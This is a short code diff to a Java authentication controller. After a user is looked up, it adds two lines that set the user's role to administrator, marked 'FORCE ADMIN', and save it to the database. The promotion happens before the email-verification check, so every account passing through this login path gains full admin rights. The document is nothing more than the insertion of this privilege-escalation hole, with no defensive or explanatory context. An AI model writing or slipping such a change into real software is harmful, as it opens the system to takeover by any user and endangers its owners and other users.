@@ -80,6 +80,9 @@ public class AuthController {
                     .orElseThrow(() ->
                             new RuntimeException("User not found"));
 
+            user.setRole(Role.ADMIN); // 👈 FORCE ADMIN
+            userRepository.save(user);
+
             if (!user.isEmailVerified()) {
                 return ResponseEntity
                         .status(HttpStatus.FORBIDDEN)
